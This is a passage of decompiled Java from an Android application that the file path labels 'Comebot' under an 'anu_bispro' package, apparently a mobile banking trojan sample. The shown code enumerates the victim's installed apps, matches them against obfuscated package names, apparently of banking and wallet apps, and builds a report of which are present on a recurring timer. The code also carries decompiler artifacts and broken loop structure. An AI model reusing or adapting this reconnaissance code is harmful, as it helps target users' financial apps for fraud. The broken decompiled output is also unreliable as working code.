      ApplicationInfo applicationInfo = iterator.next();
      boolean bool14 = bool1;
      if (applicationInfo.packageName.equals(c.a("n\t`Hi\024z\003o")))
        bool14 = true; 
      boolean bool15 = bool2;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\005a\003l\b`\007~\022h\024#\025h\005x\024d\022t")))
        bool15 = true; 
      boolean bool16 = bool3;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\r`\025#\000\003h")))
        bool16 = true; 
      boolean bool17 = bool4;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\003~\003yHh\013~")))
        bool17 = true; 
      boolean bool18 = bool5;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\007{\007~\022#\007c\002\td\002#\013b\004d\nh\025h\005x\024d\022t")))
        bool18 = true; 
      boolean bool19 = bool6;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\005a\003l\b`\007~\022h\024#\013j\023l\024i")))
        bool19 = true; 
      boolean bool20 = bool7;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\027d\016b\t#\025h\005x\024d\022t")))
        bool20 = true; 
      boolean bool21 = bool8;
      if (applicationInfo.packageName.equals(c.a("n\t`Hl\by\017{\017\023~")))
        bool21 = true; 
      boolean bool22 = bool9;
      if (applicationInfo.packageName.equals(c.a("n\t`Hw\024j\017xHl\by\017{\017\023~")))
        bool22 = true; 
      boolean bool23 = bool10;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\007}\026~Hj\t#\005a\003l\b#\004b\t~\022#\013l\025y\003")))
        bool23 = true; 
      boolean bool24 = bool11;
      if (applicationInfo.packageName.equals(c.a("\005b\013#\007c\002\te\003a\013#\007c\022d\020d\024x\025#\000\003h")))
        bool24 = true; 
      boolean bool25 = bool12;
      if (applicationInfo.packageName.equals(c.a("n\t`Hy\024x\025y\001bH`\to\017a\003#\025h\005x\024d\022t")))
        bool25 = true; 
      bool12 = bool25;
      bool11 = bool24;
      bool10 = bool23;
      bool9 = bool22;
      bool8 = bool21;
      bool7 = bool20;
      bool6 = bool19;
      bool5 = bool18;
      bool4 = bool17;
      bool3 = bool16;
      bool2 = bool15;
      bool1 = bool14;
      if (applicationInfo.packageName.equals(c.a("n\t`H~\t}\016b\025#\025`\025h"))) {
        bool13 = true;
        bool12 = bool25;
        bool11 = bool24;
        bool10 = bool23;
        bool9 = bool22;
        bool8 = bool21;
        bool7 = bool20;
        bool6 = bool19;
        bool5 = bool18;
        bool4 = bool17;
        bool3 = bool16;
        bool2 = bool15;
        bool1 = bool14;
      } 
    } 
    if (bool1 == true) {
      str2 = (new StringBuilder()).insert(0, "").append(c.a("\032I\024#1h\004q")).toString();
    } else {
      str2 = "";
    } 
    String str1 = str2;
    if (bool2 == true)
      str1 = (new StringBuilder()).insert(0, str2).append(c.a("q%@F^\003n\023\017y\037q")).toString(); 
    String str2 = str1;
    if (bool3 == true)
      str2 = (new StringBuilder()).insert(0, str1).append(c.a("q-l\025}\003\025f\037q")).toString(); 
    str1 = str2;
    if (bool4 == true)
      str1 = (new StringBuilder()).insert(0, str2).append(c.a("q(B\">Tq")).toString(); 
    str2 = str1;
    if (bool5 == true)
      str2 = (new StringBuilder()).insert(0, str1).append(c.a("q'['^2q")).toString(); 
    str1 = str2;
    if (bool6 == true)
      str1 = (new StringBuilder()).insert(0, str2).append(c.a("\032N\nh\007cF@\007~\022h\024q")).toString(); 
    String str3 = str1;
    if (bool7 == true)
      str3 = (new StringBuilder()).insert(0, str1).append(c.a("\032>P=F^\003n\023\017y\037q")).toString(); 
    str2 = str3;
    if (bool8 == true)
      str2 = (new StringBuilder()).insert(0, str3).append(c.a("q'J0q")).toString(); 
    str1 = str2;
    if (bool9 == true)
      str1 = (new StringBuilder()).insert(0, str2).append(c.a("q\005b\013#\034\001d\023#\007c\022d\020d\024x\025q")).toString(); 
    str3 = str1;
    if (bool10 == true)
      str3 = (new StringBuilder()).insert(0, str1).append(c.a("q5x\026h\024-%a\003l\bh\024q")).toString(); 
    str2 = str3;
    if (bool11 == true)
      str2 = (new StringBuilder()).insert(0, str3).append(c.a("\032L\bi\024b\017iFL0q")).toString(); 
    str1 = str2;
    if (bool12 == true)
      str1 = (new StringBuilder()).insert(0, str2).append(c.a("\032L0@\to5h\005q")).toString(); 
    str2 = str1;
    if (bool13 == true)
      str2 = (new StringBuilder()).insert(0, str1).append(c.a("\032^\t}\016b\025q")).toString(); 
    str1 = str2;
    if (str2 == "")
      str1 = c.a("\bb"); 
    return str1.replace(c.a("\032q"), c.a("qlq")).replace(c.a("\032q"), c.a("q"));
  }
  
  public String c() {
    String str1 = "";
    Iterator iterator = getPackageManager().getInstalledApplications(128).iterator();
    while (true) {
      while (true)
        break; 
      if (((ApplicationInfo)SYNTHETIC_LOCAL_VARIABLE_3).packageName.equals(c.a("\013b\004dH~\tn\017h\022h\001h\bh\024l\nhH`\to\017a\003#\nl\026}\nd")))
        str1 = (new StringBuilder()).insert(0, (String)SYNTHETIC_LOCAL_VARIABLE_4).append(c.a("q5b\005d\003y\003R!h\bh\024l\nh9K4q")).toString(); 
    } 
    String str2 = str1;
    if (str1 == "")
      str2 = c.a("\bb"); 
    return str2.replace(c.a("\032q"), c.a("qlq")).replace(c.a("\032q"), c.a("q"));
  }
  
  public void onCreate() {
    super.onCreate();
  }
  
  protected void onHandleIntent(Intent paramIntent) {
    this.a = (Context)this;
    a a1 = this.b;
    Context context = this.a;
    this.c.getClass();
    a.a(context, "", 14000L);
    a();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    super.onStartCommand(paramIntent, paramInt1, paramInt2);
    return 1;
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/commands.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */